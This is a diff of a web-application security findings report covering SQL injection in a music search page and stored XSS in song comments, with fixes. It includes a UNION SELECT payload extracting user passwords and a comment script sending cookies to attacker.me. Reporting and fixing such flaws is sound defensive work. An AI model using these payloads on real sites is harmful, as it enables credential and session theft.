@@ -1,4 +1,4 @@
-1. SQL Injection (High)
+1. SQL Injection on search page (High)
 a. Description
 The music search page has a SQL Injection vulerability. When user input a search string, the web application creates SQL query string by concatenating the search string with predefined SQL query.
 
@@ -9,10 +9,45 @@ $query = "SELECT name,description,author from songs where name LIKE '%" + $keywo
 By sending a malicious keyword, attackers can modify the SQL query string to extract data from other tables. For example, if attackers send the string 0000' UNION SELECT username, password, email from users ' # then the query string will become
 SELECT name,description,author from songs where name LIKE '%00000' UNION SELECT username, password, email from users 
 b. Impact
-Malicious attackers can extract data from the database and can control the server by uploading a shell into the server.
+Malicious attackers can use search page extract data from the database and can control the server by uploading a shell into the server.
 c. Solution
-Use prepared statement instead
-2. Cross site scripting
+Build SQL query string using the prepared statement instead of concatenating strings. For instance, to fix the above code, we can use:
+```
+$keyword = $_GET["keyword"];
+$stmt = $conn->prepare("SELECT name,description,author from songs where name LIKE ?");
+$stmt->bind_param("s", $keyword);
+```
+d. Reference
+https://owasp.org/www-community/attacks/xss
+https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+2. Stored cross site scripting (XSS) on music comment page (High)
+a. Description
+The website allows users to comment on a song. After the user posts a comment, it will be stored in the database and displayed to all the users visiting the page.
+The code to display the comment is as follows:
+```
+while ($row = $result->fetch_assoc()) {
+    echo '<p class="user_comment">' . $row["comment"]. '</p>';
+  }
+```
+If attackers submit malicious javascript as the comment, it will be executed in the browsers of users who view the comment. For example, the attacker can submit the following comment to steal user cookie:
+```
+<script>document.write('<img src="https://attacker.me/collect.gif?cookie="' + document.cookie + '" width=0 height=0 />')</script>
+```
+Additionally, the web application allows javascript to directly access the cookie, which allows attackers to directly access user session id.
+b. Impact
+An attacker can post a malicious comment to steal sessions of users who access the page.
+c. Solution
+- Convert the special HTML characters to HTML entities before returning them to the client. For example, the above code can be fixed using htmlspecialchars:
+```
+while ($row = $result->fetch_assoc()) {
+    echo '<p class="user_comment">' . htmlspecialchars($row["comment"]) . '</p>';
+  }
+```
+- Set the HttpOnly flag in the HTTP Reponse so cookie can not be accessed directly by javascript.
+d. Reference
+- https://owasp.org/www-community/attacks/xss/
+- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+- https://owasp.org/www-community/HttpOnly
 3. Command injection
 5. Use of vulerable software
 6. Privilege escalation
